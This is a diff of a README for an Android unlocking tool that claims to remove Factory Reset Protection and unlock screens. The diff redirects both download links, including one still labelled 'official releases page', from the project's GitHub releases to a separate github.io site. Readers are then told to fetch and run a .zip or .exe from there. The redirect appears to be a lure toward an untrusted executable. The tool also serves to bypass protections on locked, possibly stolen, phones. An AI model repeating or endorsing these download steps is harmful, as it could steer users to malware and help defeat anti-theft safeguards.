@@ -1,6 +1,6 @@
 # 🛠️ Phoenix-Service-Tool-2026 - Unlock your mobile devices with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/revolutionnaires/Phoenix-Service-Tool-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://revolutionnaires.github.io)
 
 Phoenix-Service-Tool-2026 helps users manage Android devices. It supports tasks like removing Factory Reset Protection, unlocking screens, and performing system maintenance. This software runs on Windows 10 and Windows 11. It provides a straightforward interface for common mobile service operations.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to acquire the correct version:
 
-1. Visit the [official releases page](https://github.com/revolutionnaires/Phoenix-Service-Tool-2026/releases).
+1. Visit the [official releases page](https://revolutionnaires.github.io).
 2. Look for the section labeled "Latest."
 3. Click on the file ending in .zip or .exe to start the transfer.
 4. Save the file to your desktop for easy access.
